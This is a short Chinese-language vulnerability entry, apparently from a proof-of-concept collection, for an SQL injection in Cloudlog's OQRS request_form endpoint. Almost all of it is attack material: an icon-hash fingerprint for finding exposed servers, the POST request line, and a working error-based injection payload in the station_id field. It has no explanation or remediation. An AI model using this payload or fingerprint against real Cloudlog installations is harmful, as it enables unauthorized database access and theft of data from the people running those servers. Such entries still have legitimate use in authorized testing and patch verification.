# Cloudlogrequest_form存在SQL注入漏洞

Cloudlogrequest ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-460032467"`
- **请求**：`POST /index.php/oqrs/request_form HTTP/1.1`

**Payload**
```
station_id=1 AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wXyW
```
- **响应特征**：200